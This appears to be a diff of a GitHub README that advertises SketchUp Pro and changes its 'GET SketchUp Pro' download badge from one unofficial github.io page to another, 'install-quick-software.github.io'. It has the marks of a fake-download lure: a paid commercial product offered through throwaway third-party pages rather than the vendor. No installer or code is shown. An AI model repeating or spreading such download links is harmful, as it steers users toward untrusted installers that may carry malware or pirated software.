@@ -1,13 +1,13 @@
 # SketchUp Pro – Advanced 3D Design and Visualization Platform  
 
 <div align="center">  
-<img src="https://global.discourse-cdn.com/sketchup/optimized/3X/6/8/6867be723cd855181b4a0ea3015fff6401c9cddb_2_500x500.png" alt="SketchUp Pro Logo" width="500">  
+<img src="https://global.discourse-cdn.com/sketchup/optimized/3X/6/8/6867be723cd855181b4a0ea3015fff6401c9cddb_2_500x500.png" alt="SketchUp Pro Logo" width="400">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/sketchup-pro">  
+<a href="https://install-quick-software.github.io/.github/sketchup-pro">  
 <img src="https://img.shields.io/badge/💻_GET_SketchUp_Pro-red?style=for-the-badge&logo=apple" alt="GET SketchUp Pro">  
 </a>  
 </div>
